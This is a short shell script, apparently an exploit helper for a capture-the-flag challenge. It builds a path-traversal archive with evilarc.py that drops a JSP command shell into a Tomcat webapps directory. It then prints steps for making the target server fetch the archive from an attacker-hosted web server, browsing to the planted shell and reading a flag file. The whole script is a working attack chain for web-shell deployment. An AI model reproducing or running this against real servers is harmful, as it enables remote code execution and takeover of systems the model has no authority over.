#!/bin/sh

rm app.war app.jar
zip -r app.war cmdjsp.jsp
python evilarc.py -f app.jar -p usr/local/tomcat/webapps/ -o unix app.war
echo ""
echo "Host app.jar with a local web server to (i.e. python3 -m http.server 8000)"
echo ""
echo "Send a post request to http://{target_ip}/rest/jar, with payload of {'fileUrl':'jar:http://{your_ip_accessible_within_docker_network}:8000/app.jar!/'}"
echo ""
echo "For example: curl 'http://127.0.0.1:9300/rest/jar' -H 'Accept: application/json, text/javascript' -H 'Content-Type: application/json' --data '{\"fileUrl\":\"jar:http://192.168.1.9:8000/app.jar!/\"}'"
echo ""
echo "Then browse to http://127.0.0.1:9300/app/cmdjsp.jsp"
echo "Cat flag in /home/tomcat/flag/flag.txt to win"
echo ""
